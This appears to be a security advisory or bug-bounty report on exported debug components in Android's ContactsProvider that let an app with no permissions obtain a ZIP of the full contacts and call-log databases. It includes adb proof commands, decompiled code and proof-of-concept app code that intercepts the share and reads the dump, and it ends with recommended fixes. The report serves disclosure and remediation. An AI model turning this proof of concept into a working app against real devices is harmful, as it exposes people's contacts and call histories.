# Exported DumpFileProvider in ContactsProvider Enables Zero-Permission Contacts Database Exfiltration

## Summary

The AOSP ContactsProvider (`com.android.providers.contacts`) ships two debug components in production builds that are exported without any permission requirements:

1. **`ContactsDumpActivity`** (`com.android.providers.contacts.debug.ContactsDumpActivity`) — exported activity that triggers a full dump of the contacts provider data directory (databases, shared_prefs, all files) into a ZIP file
2. **`DumpFileProvider`** (`com.android.providers.contacts.debug.DumpFileProvider`, authority `com.android.contacts.dumpfile`) — exported ContentProvider that serves dump ZIP files via `openFile()` without any caller permission validation

A zero-permission attacker app can:
1. Launch ContactsDumpActivity to present the user with a "Dump contacts database?" dialog
2. Register as a share handler for `application/zip`
3. When the user clicks Confirm and the share chooser appears, the attacker app is listed as a share target
4. If the user selects the attacker app, it receives the `content://com.android.contacts.dumpfile/` URI with read access
5. The attacker reads the ZIP, which contains the **entire contacts provider data directory** (contacts2.db, call_log.db, shared_prefs, etc.)

## Severity

**HIGH** — Confidentiality violation. Complete contacts database exfiltration by a zero-permission app with 2 user interactions (dialog confirmation + share target selection). The dump contains all contacts, phone numbers, email addresses, call history, account sync data, and provider configuration.

## Affected Component

- **Package**: `com.android.providers.contacts` (system priv-app)
- **Source**: `/system/priv-app/ContactsProvider/ContactsProvider.apk`
- **Components**: `ContactsDumpActivity` (exported=true, enabled=true), `DumpFileProvider` (exported=true, no permission)
- **Authority**: `com.android.contacts.dumpfile`
- **Tested on**: Pixel 6a, Android 17 Beta (API 37), `targetSdkVersion=37`

## Root Cause

Two debug-only components are compiled into the production APK and left **exported=true** without any permission protection:

### 1. ContactsDumpActivity (Manifest)
```xml
<activity android:name=".debug.ContactsDumpActivity" android:exported="true">
    <intent-filter>
        <action android:name="com.android.providers.contacts.DUMP_DATABASE"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

### 2. DumpFileProvider (Manifest)
```xml
<provider android:name=".debug.DumpFileProvider"
    android:exported="true"
    android:authorities="com.android.contacts.dumpfile"/>
<!-- NO android:permission, android:readPermission, or android:writePermission -->
```

### DataExporter.exportData() dumps EVERYTHING
```java
// Line 29: Recursively zips the ENTIRE data directory of the contacts provider
addDirectory(context, zipOutputStream, context.getFilesDir().getParentFile(), "contacts-files");
```

`getFilesDir().getParentFile()` resolves to `/data/data/com.android.providers.contacts/`, which includes:
- `databases/contacts2.db` — all contacts, phone numbers, emails, addresses
- `databases/contacts2.db-wal` — write-ahead log with recent changes
- `databases/calllog.db` — complete call history
- `databases/profile.db` — device owner profile
- `shared_prefs/` — provider configuration, account sync state
- All other files in the data directory

### DumpFileProvider.openFile() has NO permission check
```java
public ParcelFileDescriptor openFile(Uri uri, String str) {
    if (!"r".equals(str)) throw new UnsupportedOperationException();
    String strExtractFileName = extractFileName(uri);
    DataExporter.ensureValidFileName(strExtractFileName);  // Only validates filename regex
    return ParcelFileDescriptor.open(
        DataExporter.getOutputFile(getContext(), strExtractFileName), 268435456);
}
```

The only validation is that the filename matches `[0-9A-Fa-f]+-contacts-db\.zip`. There is no `getCallingUid()`, `checkCallingPermission()`, or any other caller validation.

### Dump file persists after share
The `onActivityResult()` method does NOT call `removeDumpFiles()`:
```java
protected void onActivityResult(int i, int i2, Intent intent) {
    updateDeleteButton();         // Only updates UI
    mConfirmButton.setEnabled(true);
    mCancelButton.setEnabled(true);
    // NO removeDumpFiles() — the dump persists indefinitely
}
```

## Attack Flow

```
┌─────────────────────┐
│ Zero-Perm Attacker  │
│ App (uid=10392)     │
│ NO permissions      │
└─────────┬───────────┘
          │ 1. am start -a com.android.providers.contacts.DUMP_DATABASE
          ▼
┌─────────────────────┐
│ ContactsDumpActivity│ (exported=true, no permission)
│ Dialog: "Dump       │
│ contacts database?" │
│ [Confirm] [Delete]  │
│ [No]                │
└─────────┬───────────┘
          │ 2. User clicks "Confirm" (vague dialog, no security warning)
          ▼
┌─────────────────────┐
│ DataExporter        │
│ exportData()        │ Creates ZIP of ENTIRE /data/data/com.android.providers.contacts/
│ contacts2.db        │ ← ALL contacts, phone numbers, emails
│ calllog.db          │ ← Complete call history
│ profile.db          │ ← Device owner profile
│ shared_prefs/       │ ← Account sync state
└─────────┬───────────┘
          │ 3. ACTION_SEND chooser with dump URI
          ▼
┌─────────────────────┐
│ Share Chooser       │
│ ┌─────────────────┐ │
│ │ ZeroPerm App    │◄──── 4. Attacker registered for application/zip
│ └─────────────────┘ │
│ ┌─────────────────┐ │
│ │ Gmail           │ │
│ └─────────────────┘ │
└─────────┬───────────┘
          │ 5. User selects attacker app
          ▼
┌─────────────────────┐
│ DumpReceiverActivity│ (attacker's share handler)
│ Reads EXTRA_STREAM  │
│ Opens ZIP stream    │ ← Reads full contacts database
│ EXFILTRATION        │
│ COMPLETE            │
└─────────────────────┘
```

## Dynamic Proof

### Proof 1: Activity launches from any app (zero permissions)
```
$ adb shell am start -a "com.android.providers.contacts.DUMP_DATABASE"
Starting: Intent { act=com.android.providers.contacts.DUMP_DATABASE }
```
No SecurityException, no permission denial. Activity launches successfully.

### Proof 2: Activity confirmed exported and enabled in production build
```
$ adb shell pm query-activities -a com.android.providers.contacts.DUMP_DATABASE
Activity #0:
  name=com.android.providers.contacts.debug.ContactsDumpActivity
  packageName=com.android.providers.contacts
  enabled=true exported=true
  sourceDir=/system/priv-app/ContactsProvider/ContactsProvider.apk
  targetSdkVersion=37
```

### Proof 3: Provider accessible without ANY permissions
```
$ adb shell content query --uri content://com.android.contacts.dumpfile/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789-contacts-db.zip --projection _size
Row: 0 _size=NULL
```
Returns a cursor with `_size=NULL` (file doesn't exist yet). **No SecurityException** — the provider accepts requests from any caller.

### Proof 4: Provider openFile() has no permission check
```
$ adb shell content read --uri content://com.android.contacts.dumpfile/aaaa-contacts-db.zip
java.io.FileNotFoundException: open failed: ENOENT (No such file or directory)
```
Returns FileNotFoundException (file doesn't exist), **NOT** SecurityException. The provider attempted to open the file without checking the caller's identity.

## Proof-of-Concept App

### AndroidManifest.xml (relevant portion)
```xml
<!-- No permissions declared -->
<activity android:name=".ContactsDumpExploitActivity" android:exported="true"/>

<!-- Share handler to intercept the dump -->
<activity android:name=".DumpReceiverActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.SEND"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:mimeType="application/zip"/>
    </intent-filter>
</activity>
```

### ContactsDumpExploitActivity.java
```java
// Launches the dump activity — no permissions needed
Intent i = new Intent("com.android.providers.contacts.DUMP_DATABASE");
startActivity(i);
```

### DumpReceiverActivity.java
```java
// Receives the shared dump ZIP and reads all contacts data
Uri streamUri = getIntent().getParcelableExtra(Intent.EXTRA_STREAM);
InputStream is = getContentResolver().openInputStream(streamUri);
ZipInputStream zis = new ZipInputStream(is);
ZipEntry entry;
while ((entry = zis.getNextEntry()) != null) {
    // Read contacts2.db, calllog.db, profile.db, shared_prefs/, etc.
    Log.w(TAG, "EXFILTRATED: " + entry.getName() + " (" + size + " bytes)");
}
```

## Impact

- **Confidentiality**: Complete exfiltration of ALL contacts (names, phone numbers, email addresses, physical addresses, notes, organization info), call history (call times, durations, numbers), device owner profile, and provider configuration
- **Data scope**: The dump includes the raw SQLite databases, which contain MORE data than the Contacts content provider exposes through its standard URI interface (internal metadata, sync state, deleted contacts not yet purged, etc.)
- **User interaction**: Two interactions required (confirm dialog + share target selection), but the dialog text is vague and contains no security warning
- **Persistence**: The dump file remains on disk after the share chooser is dismissed, creating a window for alternative exfiltration methods

## Recommended Fix

1. **Remove debug components from production builds** — `ContactsDumpActivity` and `DumpFileProvider` should be excluded from release APKs via build configuration
2. **If retained**: Add `android:permission="android.permission.DUMP"` (signature-level) to both components
3. **If retained**: Set `android:exported="false"` on both components
4. **Add permission check in DumpFileProvider.openFile()**: Validate `getCallingUid()` against the system UID or a signature-level permission
5. **Clean up dump files**: Call `removeDumpFiles()` in `onActivityResult()` and `onDestroy()`

## Test Environment

- **Device**: Google Pixel 6a (bluejay)
- **OS**: Android 17 Beta (API 37)
- **Build**: `targetSdkVersion=37`
- **ContactsProvider**: `/system/priv-app/ContactsProvider/ContactsProvider.apk` (versionCode=37)
- **Attacker app**: `com.vrp.zeroperm` (uid=10392, ZERO Android permissions)
